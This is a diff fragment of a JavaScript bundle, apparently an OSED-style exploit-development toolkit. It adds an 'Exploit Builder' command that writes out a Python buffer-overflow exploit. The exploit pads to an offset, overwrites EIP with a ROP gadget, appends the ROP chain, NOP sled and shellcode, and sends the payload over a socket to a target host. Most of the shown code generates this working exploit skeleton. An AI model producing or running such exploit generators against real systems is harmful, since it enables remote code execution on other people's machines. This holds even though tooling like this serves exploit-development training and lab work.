+      pythonLines.push("# ---- Assemble payload ----");
+      pythonLines.push('padding = b"A" * offset');
+      pythonLines.push("# The EIP overwrite: first gadget of the ROP chain");
+      if ((chainPlan == null ? void 0 : chainPlan.success) && chainPlan.steps.length > 0) {
+        const eipStep = chainPlan.steps[0];
+        const eipWord = eipStep.kind === "gadget" ? hex32(eipStep.address) : (_k = eipStep.placeholder) != null ? _k : hex32(eipStep.value);
+        pythonLines.push(`eip = pack("<I", ${eipWord})  # ${eipStep.comment}`);
+        pythonLines.push("# rop[4:] is the rest of the chain (eip already consumed the first dword)");
+        pythonLines.push("chain_body = rop[4:]");
+      } else {
+        pythonLines.push('eip = pack("<I", 0x41414141)  # TODO: first gadget address');
+        pythonLines.push("chain_body = rop");
+      }
+      pythonLines.push("");
+      pythonLines.push("payload = padding + eip + chain_body + nops + shellcode");
+      pythonLines.push('payload += b"C" * (total_length - len(payload))');
+      pythonLines.push("");
+      pythonLines.push("# ---- Send ----");
+      pythonLines.push("s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)");
+      pythonLines.push("s.connect((target_host, target_port))");
+      pythonLines.push("# s.recv(1024)  # banner");
+      pythonLines.push("s.send(payload)");
+      pythonLines.push("s.close()");
+      pythonLines.push(`print(f"[*] Sent {len(payload)} bytes to {target_host}:{target_port}")`);
+      for (const line of pythonLines) {
+        print(line);
+      }
+      for (const w of allWarnings) warn(w);
+      for (const e of allErrors) error(e);
+      const rows = [
+        {
+          API: strategyName,
+          "IAT Slot": iatSlotAddr !== void 0 ? hex32(iatSlotAddr) : "not found",
+          Buffer: bufAddr,
+          Chain: (chainPlan == null ? void 0 : chainPlan.success) ? `${chainPlan.steps.length} steps` : "incomplete",
+          Shellcode: encodeResult ? `${encodeResult.totalSize} bytes` : "none",
+          Return: retGadgetAddr !== void 0 ? hex32(retGadgetAddr) : "placeholder"
+        }
+      ];
+      renderRows("Exploit Builder", rows);
+      setResult({
+        command: "rop.generate",
+        args: options,
+        success: ((_l = chainPlan == null ? void 0 : chainPlan.success) != null ? _l : false) && allErrors.length === 0,
+        findings: [{ python: pythonLines, chain: chainPlan, encode: encodeResult }],
+        warnings: allWarnings,
+        errors: allErrors
+      });
+      return toDxResult("Exploit Builder", rows);
+    };
     for (const command of registry.getAll()) {
       api[command.name] = (...args) => {
         return invoke(command.name, args);
@@ -14957,7 +15609,8 @@ var osed_bundle = (() => {
       frame_wpm: executeRopFrameWpm,
       frame_va: executeRopFrameVa,
       frame_write: executeRopFrameWrite,
-      slot_call: executeRopSlotCall
+      slot_call: executeRopSlotCall,
+      generate: executeRopGenerate
     };
     api.rop_find = (...args) => invoke("rop", args);
     api.exploit = {
